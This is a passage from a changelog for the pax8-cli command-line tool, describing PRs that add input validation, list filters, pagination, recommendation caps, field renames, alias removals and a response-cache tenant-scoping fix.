- [#381](https://github.com/pax8labs/pax8-cli/pull/381) [`830774a`](https://github.com/pax8labs/pax8-cli/commit/830774a8845058541f6cc01afc16dc147694cdbe) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies create` (and its `pax8 clients create` alias) now creates Active companies by default via the atomic contacts-array pattern (PAM-997 / PAM-1171 / ARC-774). The same `POST /companies` accepts an optional `contacts: [...]` array; including a properly-typed primary contact flips the new company from Inactive to Active at creation.

  New required flags on the default (atomic) path: `--first-name`, `--last-name`, `--email`, `--phone`. The supplied contact is implicitly set as `primary: true` for all three ContactType values (Admin, Billing, Technical), matching the Pax8 API Reference's activation guidance: "one contact with all three types and marked as primary for each type is sufficient." `--phone` is shared between the company and the contact — partners who need different phones can use `--company-only` then `pax8 contacts create`.

  Opt-out via `--company-only` produces an Inactive company. The command prints a verbatim warning to stderr explaining the consequences (won't appear in portal, won't support orders/subscriptions/quotes, blocks re-creation with "already exists" until primary contacts are added via `pax8 contacts create`).

  `@pax8/core` schema: new `CreateCompanyContactInputSchema` for the inline contact payload; `CreateCompanyInputSchema` gains an optional `contacts` field. The inline shape mirrors `CreateContactInputSchema` but omits `companyId` (the company doesn't exist yet).

  Closes [#330](https://github.com/pax8labs/pax8-cli/issues/330). Addresses pre-publish review feedback that the v0.1.0 CLI was creating Inactive companies that partners couldn't use until they discovered the contact requirement.

- [#379](https://github.com/pax8labs/pax8-cli/pull/379) [`a0cc155`](https://github.com/pax8labs/pax8-cli/commit/a0cc155972dd75ea4bd57870172d81015dfeed8a) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 companies *` renamed to `pax8 clients *` with `companies` retained as an indefinite deprecated alias via Commander's native `.alias()` mechanism. Both invocations route through the exact same Command graph and action handlers — there's structurally only one command graph, so the surfaces can't drift. Pax8 is structurally moving away from the COMPANY noun in API contracts (PAE-2054 governance, Client Archetype PRD, portal's "New Client Creation Form" GA, v2 quotes API `clientId`). The CLI command surface adopts the user-facing canonical noun now; JSON output fields (`companyId`, `companyName`, etc.) stay aligned with the current public API and will migrate when the API does. The `--company` flag on other commands (`subscriptions list`, `contacts list`, etc.) is unchanged — flag mirrors the API field, no rename until the API renames. Closes [#317](https://github.com/pax8labs/pax8-cli/issues/317). Doc updates (README, skill.md, AGENTS.md, CLAUDE.md, domain-review.md) tracked separately under [#378](https://github.com/pax8labs/pax8-cli/issues/378).

- [#412](https://github.com/pax8labs/pax8-cli/pull/412) [`edb1a09`](https://github.com/pax8labs/pax8-cli/commit/edb1a0919d9a24848ec0195de5a82dde52df93ff) Thanks [@jidulberger](https://github.com/jidulberger)! - Fail-fast input validation on enum-bearing flags + inline "Did you mean" suggestions on fuzzy product-name resolution. Closes [#408](https://github.com/pax8labs/pax8-cli/issues/408) (partner-walkthrough Group A: findings [#2](https://github.com/pax8labs/pax8-cli/issues/2), [#8](https://github.com/pax8labs/pax8-cli/issues/8), [#9](https://github.com/pax8labs/pax8-cli/issues/9)).

  Before this change, a typo like `pax8 subscriptions list --status FooBar` round-tripped to the API and returned `[]` — the partner debugged an "empty result" mystery instead of fixing a typo. Similarly, `pax8 orders create --product "Microsoft 365"` dead-ended with "Product not found" even though the catalog had close matches; the partner had to round-trip through `pax8 products search` to find the canonical name.

  **Enum validation (newly wired, 9 flag/command pairs).** New `validateEnum()` and `validateEnumList()` helpers in `packages/cli/src/lib/validate.ts` fail-fast at the CLI layer with a `CliError(ERROR_INVALID_INPUT)` carrying the full allowed set. Wired across:
  - `pax8 subscriptions list --status` — the canonical case from finding [#2](https://github.com/pax8labs/pax8-cli/issues/2).
  - `pax8 companies list --status` — same shape ([#9](https://github.com/pax8labs/pax8-cli/issues/9)).
  - `pax8 invoices list --status`.
  - `pax8 quotes list --status` — case-insensitive (server-side wire enum is lowercase).
  - `pax8 recommendations list --priority` and `--type`.
  - `pax8 recommendations act --priority`.
  - `pax8 orders create --billing-term` (and per-`--line-item billing-term=` entries).
  - `pax8 cost sim --billing-term`.
  - `pax8 quotes create --billing-term`, `pax8 quotes update --billing-term`, `pax8 quotes line-items add --billing-term`.

  The existing `pax8 subscriptions update --billing-term` already validated via `validateBillingTermInput()` (PR [#336](https://github.com/pax8labs/pax8-cli/issues/336)) and is left in place — the new helper is a generic floor, not a replacement.

  **Fuzzy product resolution with suggestions.** `resolveProduct()` now ranks the catalog by token-overlap on a miss and surfaces the top 3 as inline `Did you mean: <name> (<id>)` recovery steps. The "Multiple matches" branch also includes IDs so the partner can copy-paste a canonical product reference without round-tripping through `pax8 products search`. Benefits every command that resolves product names: `orders create`, `quotes line-items add`, `quotes create`, `quotes update`, `cost sim`, and `products show`.

  **No existing behavior changes** for valid input — every passing flag value still resolves the same way. Help text on affected commands now lists the canonical accepted set explicitly (some already did per [#250](https://github.com/pax8labs/pax8-cli/issues/250); the rest are aligned).

- [#405](https://github.com/pax8labs/pax8-cli/pull/405) [`d20b113`](https://github.com/pax8labs/pax8-cli/commit/d20b1137ec74e81c9745f5f8f76484086a2f44e8) Thanks [@jidulberger](https://github.com/jidulberger)! - Expose every server-side list filter the OpenAPI spec already supports on the `quotes`, `clients`/`companies`, and `invoices` list endpoints. Three related fix-before-launch findings from the partner-readiness audit (`docs/triage/partner-readiness-audit/01-api-conformity-reads.md`) — the spec defined the filters, but the CLI either filtered client-side (quotes) or omitted the parameters entirely (companies, invoices), forcing partners with large portfolios to download full lists before filtering locally.
  - `pax8 quotes list --status` is now server-side and accepts the full 9-value v2 enum (`draft | assigned | sent | closed | declined | accepted | changes_requested | expired | pending`). Closes [#387](https://github.com/pax8labs/pax8-cli/issues/387).
  - `pax8 clients list` (and `pax8 companies list`) now expose `--city` / `--state` / `--country` / `--zip`, `--self-service` / `--bill-on-behalf` / `--order-approval`, and `--sort <name|city|country|state|zip>`. The CLI vocabulary maps `--state` → `stateOrProvince` and `--zip` → `postalCode` per the existing convention documented for `companies create` ([#327](https://github.com/pax8labs/pax8-cli/issues/327)/[#328](https://github.com/pax8labs/pax8-cli/issues/328)). The generic `filter` parameter on `CompaniesApi.list` (no OpenAPI backing) is dropped — no deprecation since the package is pre-v0.1.0. Closes [#388](https://github.com/pax8labs/pax8-cli/issues/388).
  - `pax8 invoices list` now exposes `--from` / `--to` (mapping to `invoiceDateRangeStart` / `invoiceDateRangeEnd`) and `--sort` with the full spec enum (`invoice-date | due-date | status | partner-name | total | balance | carried-balance`). The kebab-cased flag values map onto the wire's camelCase. Closes [#389](https://github.com/pax8labs/pax8-cli/issues/389).

  All three are additive — existing invocations without the new flags continue to work unchanged. `MockPax8Client` mirrors the server-side filtering for every new parameter so `PAX8_DEMO=1` exercises the same code path as the real API.

- [#531](https://github.com/pax8labs/pax8-cli/pull/531) [`45fe0d1`](https://github.com/pax8labs/pax8-cli/commit/45fe0d1db00d678c73b709a6137f2e64d69038f6) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 orders list` now surfaces pagination, sorts newest-first by default, and resolves company names beyond the first 200 customers. Four sub-defects from [#478](https://github.com/pax8labs/pax8-cli/issues/478) (repro: Cassie's 45,208-order partner portfolio) fixed in one PR.
  - **Pagination is visible.** `--json` now wraps the result as `{ orders, page: { number, size, totalElements, totalPages } }` (1-based `number` matches the `--page` flag). The table footer shows `Page X of Y — N orders` plus an explicit `next: pax8 orders list --page <n+1>` hint when more pages exist (suppressed on the last page). `--with-actions` adds a `nextActions` entry pre-built with the next page's command. Pre-fix the JSON output was a flat array and the footer just said `45208 orders` with no page indicator — agents and partners had no signal that pagination existed.
  - **Default sort is newest-first.** The CLI sends `?sort=createdAt,desc` by default; `--sort <field>` and `--order <asc|desc>` override. Pre-fix the CLI sent no sort hint and the real Pax8 API returned 2013-era archives in row 1 on long-lived tenants. `OrdersApi.list()` accepts the new `sort` parameter and forwards it on the wire.
  - **`--status` flag removed.** Wire-level testing on 2026-05-11 ([#369](https://github.com/pax8labs/pax8-cli/issues/369)) confirmed the Pax8 server silently ignores `?status=` — every value, including bogus ones, returned the unfiltered set. The flag was previously kept as a documented no-op, but `pax8 orders list --status Completed | grep Completed` gave partners no way to know they were looking at unfiltered data. The flag is removed entirely; Commander emits `unknown option --status` and exits 1. We'll re-add it when the platform ships real status filtering ([#369](https://github.com/pax8labs/pax8-cli/issues/369)).
  - **Company column populates beyond row 200.** The CLI pages through `companies.list` until every `companyId` referenced by the orders page is covered (capped at 10 pages of 1000 to bound the loop). When a partner has more customers than the cap can cover, a single stderr warning explains the placeholder rather than leaving silent blanks. Pre-fix the CLI fetched only the first 200 companies, so partners with >200 customers saw blank `Company` cells on most rows.

  Demo mode (`MockPax8Client`) honors the new `sort` parameter so `PAX8_DEMO=1` exercises the same code path as the real wire. The `OrdersResource.list` mock continues to filter on the dropped `status` param for backwards compatibility with any in-tree fixtures that still pass it, but no command code now sends it.

  Closes [#478](https://github.com/pax8labs/pax8-cli/issues/478).

- [#430](https://github.com/pax8labs/pax8-cli/pull/430) [`5617161`](https://github.com/pax8labs/pax8-cli/commit/561716145e254eaf91d75c00c8b6e371c8856c22) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes line-items add` and `pax8 quotes create` (shorthand path) now accept `--commitment-term <enum>` and `--commitment-term-id <uuid>`, mirroring the orders create pattern (`packages/cli/src/commands/orders/create.ts:350-351`). When `--commitment-term` is supplied, the CLI auto-resolves it to a commitment-term UUID against the partner's existing subscriptions for the product — same `resolveCommitmentTermId()` helper orders create uses. When `--commitment-term-id` is supplied directly, it wins over any `--commitment-term` (UUID short-circuits the lookup, matching orders create precedence). The resolved `commitmentTermId` rides through to `POST /v2/quotes/{quoteId}/line-items` as `AddStandardLineItemPayload.commitmentTermId` (spec-confirmed in `quoting-endpoints.json`).

  Required for Microsoft NCE and other commitment-priced SKUs per QUOTE-311 (the `AddLineItemToQuoteCommandPayload.commitmentTermId` field), QUOTE-1283 (commitment persisted on the line item itself), QUOTE-406 (backfill of older NULL rows), and the NCE proration spike (Model A canonical — commitment is decided at quote-time and inherited by the resulting order).

  `@pax8/core`: `AddQuoteLineItemInputSchema` gains `commitmentTermId: z.string().optional()` (mirrors `OrderLineItemInputSchema`'s shape — not strict `.uuid()` because demo fixtures use Pax8-style synthetic IDs). `QuoteLineItemSchema` gains `commitmentTerm: CommitmentSchema.nullable().optional()` for the read surface (`{ id, term }` per the v2 spec's `LineItemResponse.commitmentTerm`). The existing `CommitmentSchema` is reused rather than defining a new shape — its extra-optional `endDate` is harmless on the quote-line wire and reuse means future drift propagates to both consumers.

  `pax8 quotes show` and `pax8 quotes line-items list` now render a "Commit" column on the line-item table (the term label, e.g. "1-Year"); `--json` consumers see the full `commitmentTerm: { id, term }` object. Mirrors how subscriptions render `commitment.term`.

  Demo fixture: the Redwood E5 line on `quote-redwood-001` now carries `commitmentTerm: { id, term: "1-Year" }` so the render path exercises end-to-end under `PAX8_DEMO=1`.

  The parity test from [#426](https://github.com/pax8labs/pax8-cli/issues/426) (`packages/cli/src/__tests__/quotes-create-line-items-parity.test.ts`) was already structural — both new flags pass automatically. Belt-and-braces pin updated to enumerate them.

  Follow-up to [#429](https://github.com/pax8labs/pax8-cli/issues/429) (Candidate E in `docs/triage/v0.1.0-candidates.md`).

- [#429](https://github.com/pax8labs/pax8-cli/pull/429) [`be8936d`](https://github.com/pax8labs/pax8-cli/commit/be8936d688aafa06dc3b8c93a2b42ab63309a92e) Thanks [@jidulberger](https://github.com/jidulberger)! - **`pax8 quotes create` shorthand: full line-item flag parity ([#426](https://github.com/pax8labs/pax8-cli/issues/426)).** Mirrored every line-item flag from `pax8 quotes line-items add` onto the `quotes create --product` shorthand path so partners can pass `--price` and `--effective-date` (the two flags previously missing) and get the same line-item shape on the wire as the long-form two-step flow. Closes a pre-publish review gap where the shorthand could silently produce line items with default pricing / effective-date when the partner expected explicit values. Added a parity test (`packages/cli/src/__tests__/quotes-create-line-items-parity.test.ts`) that fails loudly if a future contributor adds a flag to `line-items add` without mirroring it. Construction logic is now shared via `packages/cli/src/commands/quotes/_shared.ts` (`buildLineItemPayload`) so both call sites produce identical payloads. No change to the empty-quote two-step path (`quotes create` without `--product` → `quotes line-items add` separately) — that flow continues to work exactly as today.

- [#427](https://github.com/pax8labs/pax8-cli/pull/427) [`d71a0f2`](https://github.com/pax8labs/pax8-cli/commit/d71a0f2e600332167587a2fffbf4198a32fa9e8b) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 quotes show` now surfaces server-side totals from the v2 quoting API's `QuoteResponse.totals` object. Splits one-time charges (`Total (initial)`) from per-period subscription charges (`Total (recurring)`) — each shown with currency code. Zero-bucket lines are suppressed so a recurring-only quote shows only the recurring line and an initial-only quote shows only the initial line. When the API omits totals (defensive against API drift; the spec marks the field required), render falls back to the locally-summed sum of line-item subtotals — preserves the pre-change behavior for older API responses.

  `@pax8/core` exports two new schemas / inferred types: `AmountCurrencySchema` / `AmountCurrency` and `InvoiceTotalsSchema` / `InvoiceTotals`. `QuoteSchema` and `QuoteLineItemSchema` both gain optional `totals: InvoiceTotalsSchema` fields. Optional (not required) so a partial / drifted API response doesn't fail the whole quote parse — render layer handles the absent case explicitly. JSON output passes the `totals` shape through unchanged from the wire (no transformation), so agents can read `totals.initialCost`, `totals.initialProfit`, `totals.initialTotal`, `totals.recurringCost`, `totals.recurringProfit`, `totals.recurringTotal` directly.

- [#376](https://github.com/pax8labs/pax8-cli/pull/376) [`d88ce13`](https://github.com/pax8labs/pax8-cli/commit/d88ce13c6a0b2166f70c3d87b2320376286d0c06) Thanks [@jidulberger](https://github.com/jidulberger)! - **Recommendations (additive):** `pax8 recommendations` output now carries an `opportunityType` field alongside the existing `type`, using Pax8's canonical Opportunity Explorer 5-type taxonomy (`Upsell`, `Cross-sell`, `Add-on`, `Upgrade`, `Net-new`). Existing `type` field unchanged.

  Mapping:

  | Existing `type`              | Emitted `opportunityType` |
  | ---------------------------- | ------------------------- |
  | `cross_sell` (active subs)   | `Cross-sell`              |
  | `cross_sell` (zero-sub cust) | `Net-new`                 |
  | `seat_gap`                   | `Upsell`                  |

  Zero-subscription companies now classify as `Net-new` instead of being silently routed through the `Cross-sell` rail — the closest existing surrogate for OE's `Net-new` motion, and the fix for surprise [#7](https://github.com/pax8labs/pax8-cli/issues/7) in `docs/triage/recommendations-conformance.md`.

  Added `pax8 recommendations upsell --from-product <name> --to-product <name>` following the MCP "Proactive Upsell Opportunity Finder" composition pattern (Guide §3b): list every company on the source product who does not yet have the upsell target, with seats, current MRR, and contact details (`--with-contacts`). New exports from `@pax8/core`: `findUpsellCohort`, types `UpsellMatch`, `UpsellCohortReport`, `OpportunityType`.

  Full taxonomy alignment — retiring the CLI's security-centric 7-category product taxonomy in favor of Pax8's canonical STAX/PCM categories, and migrating `seat_gap` with an alias period — is deferred to v0.2 ([#375](https://github.com/pax8labs/pax8-cli/issues/375)), to align with whatever taxonomy OE's `GET /opportunities` API publishes when ARC-785 ships.

  Extends the disclosure-over-rewrite pattern from [#298](https://github.com/pax8labs/pax8-cli/issues/298) (vocabulary alignment) and [#299](https://github.com/pax8labs/pax8-cli/issues/299) (`mrrAtRisk` → `mrrRenewing` one-cycle alias). References Pax8 taxonomy research on PICS (4 executive categories) / STAX (8 L1 operational categories) / Taxonomy v2 (in flight, hierarchical L1/L2/L3) in the new STAX-divergence doc comment at the top of `packages/core/src/services/recommendations.ts` and in the v0.2 issue ([#375](https://github.com/pax8labs/pax8-cli/issues/375)).

- [#528](https://github.com/pax8labs/pax8-cli/pull/528) [`4efa0dd`](https://github.com/pax8labs/pax8-cli/commit/4efa0dd27abb45cba1abefba673d3c5eda2e90a1) Thanks [@jidulberger](https://github.com/jidulberger)! - Cap `pax8 recommendations list` at 10 by default and add `--top <n>` (with `--top 0` for unlimited). Closes [#521](https://github.com/pax8labs/pax8-cli/issues/521).

  Against the large-portfolio fixture `pax8 recommendations list --json` returned 308 recommendations (101 marked `high`) — no cap, no sort by uplift. That's a context-window grenade for agents and signal-dilution for partners; both surfaces ended up triaging by hand.

  **Behavior changes (pre-publish, called out here so partner-readiness consumers see the diff):**
  - **New `--top <n>` flag.** Default is `10`. `--top 0` is the documented escape hatch — it opts out of the cap and emits every recommendation. Replaces the implicit "show everything" contract that [#521](https://github.com/pax8labs/pax8-cli/issues/521) found was broken on real partner volumes.
  - **Sort is now `estimatedMrrUplift` DESC, with `priority` (high > medium > low) as tiebreaker. Recommendations with a null uplift sort last.** Priority tags ("missing security = high") are heuristic; uplift is concrete dollars. A $5k/mo medium opportunity outranks a $500/mo high one — which is what a partner trying to grow MRR actually wants at the top of the list.
  - **`pax8 recommendations list --json` is now ALWAYS a wrapped envelope `{ recommendations: Recommendation[], totalAvailable: number }` — even without `--with-actions`.** This is a JSON-shape breaking change for any agent/script that previously did `JSON.parse(stdout)` and treated the result as a flat array. `totalAvailable` is the engine count BEFORE the `--top` cap fires, so consumers can detect the cap and decide whether to re-query with `--top 0`. Capping by default while silently emitting a bare array would have been exactly the anti-pattern [#483](https://github.com/pax8labs/pax8-cli/issues/483) is fixing on the report surface — partners and agents need to know what's behind the curtain. Pre-1.0, no deprecation period.
  - **`--with-actions` envelope extension.** Already wrapped, but now also carries `totalAvailable` alongside the existing `recommendations` / `nextActions` / `unmatchedProducts`. Shape: `{ recommendations, totalAvailable, nextActions, unmatchedProducts }`.
  - **Table-mode footer.** When the cap fires the human render appends `Showing top 10 of 308 recommendations. Use --top 50 or --top 0 to see more.` on stderr, so partners reading the table know there's more behind the cap without having to remember the new flag.
  - **Skill tool updated.** `pax8_recommendations` (the `@pax8/claude-skill` tool) now accepts a `top` parameter and the tool description documents the new envelope shape so MCP clients see the cap-and-totalAvailable contract.

  Out of scope (intentionally): `--priority` filtering already exists; `recommendations act` already consumes one rec at a time; the dashboard's `highRecs` already caps internally at 12. The engine in `@pax8/core` is unchanged — this is a CLI command-layer change.

- [#532](https://github.com/pax8labs/pax8-cli/pull/532) [`224f16a`](https://github.com/pax8labs/pax8-cli/commit/224f16a6030b8d89bfe67d1ba989b49d0fae8130) Thanks [@jidulberger](https://github.com/jidulberger)! - Strip deprecated aliases pre-public-launch ([#476](https://github.com/pax8labs/pax8-cli/issues/476)).

  Six alias families removed — all flagged in code as "remove in v0.3.0 / v1.0" or "one-cycle alias." Pre-launch is the cheapest time to take the breaking change; once we go public, external users adopt them and back-compat becomes a multi-year commitment.

  **CLI command surface (removed):**
  - `pax8 status` — canonical: `pax8 dashboard`
  - `pax8 companies *` — canonical: `pax8 clients *`. The `companies` verb was the original surface but [#317](https://github.com/pax8labs/pax8-cli/issues/317) made `clients` canonical; CLAUDE.md previously documented `companies` as an "indefinite" alias, which the issue rightly flagged as a "soft remove someday" trap. Cut now.
  - `pax8 webhooks create --events` — canonical: `--topics`

  **JSON / type surface (removed):**
  - `mrrAtRisk` field aliases (canonical: `mrrRenewing`, per [#298](https://github.com/pax8labs/pax8-cli/issues/298))
  - `arr*` field aliases (canonical names per [#298](https://github.com/pax8labs/pax8-cli/issues/298))
  - `createdDate` / `expiresOn` shadow fields (canonical: `createdAt`, `expiresAt`, per [#385](https://github.com/pax8labs/pax8-cli/issues/385))

  **Out of scope:**
  - Wire-side field names (`companyId`, `companyName`, body `expiresOn` on PUT) — unchanged. These are the Pax8 API contract.
  - The `--company` flag on commands that operate on a customer — unchanged. Matches the wire-side ID/name fields.

  Migration: a one-PR sweep updated CLAUDE.md, UX_GUIDE.md, AGENTS.md, skill.md, claude-skill tool descriptions, and every test that referenced the removed surface.

- [#407](https://github.com/pax8labs/pax8-cli/pull/407) [`8590150`](https://github.com/pax8labs/pax8-cli/commit/8590150a98e9779e1b17d9fc4dd0f0c9b587b1f2) Thanks [@jidulberger](https://github.com/jidulberger)! - Standardize timestamp field naming across `--json` output to canonical camelCase / past-tense / ISO 8601 (`createdAt`, `updatedAt`, `expiresAt`). Implements [#385](https://github.com/pax8labs/pax8-cli/issues/385) (B2 — block-launch refactor surfaced by the partner-readiness audit dim 02). Also closes [#390](https://github.com/pax8labs/pax8-cli/issues/390) (F5 — `Company.created` naming).

  **Migration matrix:**

  | Type         | Old field(s)                                  | New field(s)             |
  | ------------ | --------------------------------------------- | ------------------------ |
  | Company      | `created`, `updatedDate`                      | `createdAt`, `updatedAt` |
  | Order        | `createdDate`                                 | `createdAt`              |
  | Subscription | `createdDate`                                 | `createdAt`              |
  | Quote        | `createdOn`, `expiresOn`                      | `createdAt`, `expiresAt` |
  | Webhook      | `createdDate` (`updatedAt` already canonical) | `createdAt`              |

  **Deprecation policy:** During this minor-version cycle the `--json` output emits BOTH the old and new field names on every row, mirroring the `mrrAtRisk` → `mrrRenewing` precedent from [#299](https://github.com/pax8labs/pax8-cli/issues/299). Existing `--json` consumers that read the old names keep working unchanged. The old aliases are slated for removal in **v0.3.0** and carry `@deprecated` JSDoc on the schema. New code should reference the canonical names exclusively.

  **Schema-layer mechanics:** Each affected `*Schema` in `packages/core/src/api/types.ts` now wraps its object validator in a `z.preprocess()` step that accepts EITHER shape on the wire and populates BOTH names on the parsed object. The change is purely additive — new optional schema fields, no breaking changes to required ones. Demo data (`packages/core/src/mock/demo-data.ts`) keeps emitting the legacy wire shape so the preprocess code path is exercised in demo mode the same way it runs against the real API. CLI commands (`packages/cli/src/commands/`) and table/CSV column definitions reference the canonical names; the legacy aliases survive only on the `--json` output surface.

  Subprocess tests (`packages/cli/src/__tests__/{companies,subscriptions,orders,quotes,webhooks.show}.test.ts`) pin that both old and new field names are present on every row of `--json` output for all five resource types. Unit tests in `packages/core/src/api/types.test.ts` pin that parsing either wire shape (legacy or canonical) produces both names on the parsed object.

- [#419](https://github.com/pax8labs/pax8-cli/pull/419) [`9c3a0af`](https://github.com/pax8labs/pax8-cli/commit/9c3a0af0ce0d5e72d9f187bd9429008dfc8141a8) Thanks [@jidulberger](https://github.com/jidulberger)! - UX: number-pickable next-step affordances across show/detail commands and `invoices audit`. Previously, "Try next:" blocks were emitted as plain `process.stderr.write` text — partners had to copy-paste the suggested command. This change converts those blocks to use `promptNextSteps({ renderList: true })`, so a partner can scan the numbered list, type a number, and drill in.

  Converted to pickable: `subscriptions show`, `invoices show`, `quotes show` (status-aware — Draft now leads with `quotes send`), `quotes send`, `quotes update` (newly added), `quotes line-items add`, `quotes line-items list`, `companies more`, `cost sim` (now also surfaces the affected subscription when present), `contacts create`, `contacts list`, `contacts show`, `orders show` (newly added), `products search`, `subscriptions cancel`, `recommendations upsell` (newly actionable — one `orders create` step per upsell match). `invoices audit` discrepancies are indexed 1-N in the rendered output and each becomes a pickable `dispute --discrepancy <id>` step, carrying the `--month` filter through when set.

  Placeholder-style entries (`pax8 X update <some-id> --y <n>`) are dropped from pickable lists wherever they appeared and replaced with affordance-pointer framing — short prose lines that name the capability without offering a literal command (e.g. "You can also adjust quantity or billing term — run `pax8 subscriptions update --help` for syntax"). The pickable list is the entry point a partner can drill into; the affordance pointer is what they read when the next step needs values they have to choose. A regression test (`packages/cli/src/__tests__/next-step-placeholders.test.ts`) prevents drift back to the placeholder pattern.

  Workflow follow-ons added: `quotes show` on a Draft surfaces `quotes send` as the first pickable step (was missing); `recommendations upsell` is now pickable across all listed matches with a parameterized `orders create` per row; `orders show` and `quotes update` gained Try-next blocks they didn't have before. List-style commands (`subscriptions list`, `invoices list`, `orders list`, `quotes list`) are deferred to [#418](https://github.com/pax8labs/pax8-cli/issues/418) — they render tables and the drill-in design is a separate choice (extend the existing `_num`-column pattern from `clients list` / `recommendations list`).

### Patch Changes

- [#496](https://github.com/pax8labs/pax8-cli/pull/496) [`6fa54ae`](https://github.com/pax8labs/pax8-cli/commit/6fa54ae23c55041744e019e105f3a8f789a38bfb) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 auth login --json` and `pax8 doctor --json` now honor the `--json` flag and emit a structured envelope on stdout, with human-readable banners routed to stderr per `docs/UX_GUIDE.md` §1 (stdout is data, stderr is everything else). Previously both commands wrote ANSI banners to stdout regardless of `--json`, breaking `| jq` pipelines and agent-driven invocations.
  - `auth login --json` → `{ status, mode, clientIdMasked?, nextActions[] }`
  - `doctor --json` → `{ checks[], summary, version, nextActions[] }`

  The `nextActions[]` hints follow the §12 contract — for `doctor` they surface failure-specific recovery commands (re-auth, re-init, etc.) and a "you're clean, try the dashboard" hint on full success.

  Closes [#470](https://github.com/pax8labs/pax8-cli/issues/470), [#471](https://github.com/pax8labs/pax8-cli/issues/471).

- [#497](https://github.com/pax8labs/pax8-cli/pull/497) [`3796bf9`](https://github.com/pax8labs/pax8-cli/commit/3796bf9f1028bef64bf6cc6fcb24042466644740) Thanks [@jidulberger](https://github.com/jidulberger)! - Three interlocking fixes to the response-cache layer:
  1. **Tenant + base-URL scoping.** `Pax8Client.buildCacheKey` previously keyed only on path / params / api / version, so a credential rotation or `PAX8_API_BASE` flip silently served tenant-A's cached responses into a tenant-B session for up to 24h (default TTL). Cache keys now include a SHA-256-truncated hash of `(clientId, PAX8_API_BASE env, baseUrl, apiBaseOverrides)`. **Upgrading invalidates existing on-disk cache entries** because the key prefix changes — first run after upgrade will be slower as the cache refills.
  2. **Detached cache warmer removed.** `buildContext` was spawning three detached `pax8 list` child processes on every command run (companies / subscriptions / products) as a "warm the cache" optimization. Net effect was every invocation fanning into four processes, unnecessary API calls on commands that didn't need the data, and noise in `--quiet` mode process listings. Removed.
  3. **`cache.enabled` / `cache.ttl_hours` honored.** The schema accepted these fields but `buildContext` never read them, so `cache.enabled: false` in `~/.pax8/config.yaml` still got the constructor's hard-coded 1h default. Now plumbed through end-to-end.

  Closes [#455](https://github.com/pax8labs/pax8-cli/issues/455), [#466](https://github.com/pax8labs/pax8-cli/issues/466). Addresses [#253](https://github.com/pax8labs/pax8-cli/issues/253).

- [#382](https://github.com/pax8labs/pax8-cli/pull/382) [`0bace3d`](https://github.com/pax8labs/pax8-cli/commit/0bace3da212c079ba64349b11e03b57808ce5ce9) Thanks [@jidulberger](https://github.com/jidulberger)! - **Docs:** Updated user-facing docs (README, skill.md, AGENTS.md, CLAUDE.md, domain-review.md, UX_GUIDE.md) to use `pax8 clients *` as the canonical command surface, with `pax8 companies *` mentioned once per doc as a deprecated alias. Also audited and fixed stale references to `pax8 contacts add` (already uses `pax8 contacts create` to match the shipped subcommand name — per the project's `create` convention across every other resource) and a stale `--expiration-date` flag listing under `pax8 quotes create` (the flag was removed in [#339](https://github.com/pax8labs/pax8-cli/issues/339)). No behavior change. Closes [#378](https://github.com/pax8labs/pax8-cli/issues/378).

- [#435](https://github.com/pax8labs/pax8-cli/pull/435) [`5e66db4`](https://github.com/pax8labs/pax8-cli/commit/5e66db450b94fda721483e83c0fafa45f9efb51b) Thanks [@jidulberger](https://github.com/jidulberger)! - `pax8 clients create` (and its `pax8 companies create` alias) `--help` now documents that the supplied contact is implicitly assigned as primary on all three ContactType values (Admin, Billing, Technical) to satisfy activation, and points partners at `pax8 contacts update` / `pax8 contacts create --type` to re-split those roles afterward. README's Clients section gains a matching one-line note next to the `clients create` example.

  No behavior change — help-text + README only. Addresses pre-publish review feedback that the atomic-create path's implicit multi-role primary assignment (correct per `ContactService.accountHasAllPrimaryContacts`, shipped in [#381](https://github.com/pax8labs/pax8-cli/issues/381)) was invisible to partners who wanted different humans in different roles. Closes [#432](https://github.com/pax8labs/pax8-cli/issues/432).

- [#415](https://github.com/pax8labs/pax8-cli/pull/415) [`6925e0c`](https://github.com/pax8labs/pax8-cli/commit/6925e0c1010c628c398c55424ebea6c65c5d61c8) Thanks [@jidulberger](https://github.com/jidulberger)! - Polish two partner-walkthrough findings ([#409](https://github.com/pax8labs/pax8-cli/issues/409) — Group B):

  **Empty-state UX in table mode.** List commands that already routed through the `emptyState` API now also pass a structured `filtersApplied` map; the renderer surfaces it as a single "Filters applied: …" line directly under the "No <resource> found." headline. This answers "why is this empty?" with the partner's own filter values before any speculative reasons. JSON / CSV / `--ids-only` / quiet output contracts are unchanged — agents and pipelines reading `--json` still see exactly `[]`. Touched commands: `companies list`, `subscriptions list`, `orders list`, `invoices list`, `quotes list`, `usage list`, `products list`, `products search` (refactored off ad-hoc empty handling onto the shared helper).

  **Commitment-aware cancel preview.** `pax8 subscriptions cancel <id>` now prints a one-line headline branch in table mode BEFORE the confirmation prompt: committed subs show `This subscription has an active commitment ending YYYY-MM-DD.` (then the existing yellow `⚠ COMMITMENT ACTIVE` block), and uncommitted subs show `This subscription has no active commitment. Cancellation will take effect immediately.` This addresses the walkthrough Finding [#7](https://github.com/pax8labs/pax8-cli/issues/7) where a Monthly-sub partner had no pre-flight signal that cancellation was immediate. JSON mode is unchanged. Vocabulary stays on the canonical "commitment term end date" framing (no ETF / penalty / fee per the Direct User Agreement).

- [#414](https://github.com/pax8labs/pax8-cli/pull/414) [`a0d918e`](https://github.com/pax8labs/pax8-cli/commit/a0d918e53a24ce724b4bbbd61bef1dabaaaffbad) Thanks [@jidulberger](https://github.com/jidulberger)! - **Docs / help text:** Added `JSON output (--json):` sections to `--help` on commands with nested or computed response shapes — `pax8 cost sim`, `pax8 dashboard` (and the `status` alias), `pax8 recommendations list`, `pax8 invoices audit`, `pax8 subscriptions renewals`, `pax8 report mrr`, `pax8 report growth`. Partners parsing `--json` no longer have to run a command to discover its shape; the contract is pinned in `--help`. Renewals and dashboard call out the deprecated `mrrAtRisk` / `arrAtRisk` aliases (per [#299](https://github.com/pax8labs/pax8-cli/issues/299)) and dashboard calls out the deprecated `createdDate` alias (per [#385](https://github.com/pax8labs/pax8-cli/issues/385)). Also expanded the README "Metric definitions" section with an explicit STAX taxonomy divergence subsection (CLI 7-category taxonomy and `seat_gap` heuristic vs. canonical STAX / Seat Utilization) and a mapping table — disclosure that previously lived only in `--help` and the module docstring, neither of which `--json` consumers see. Closes 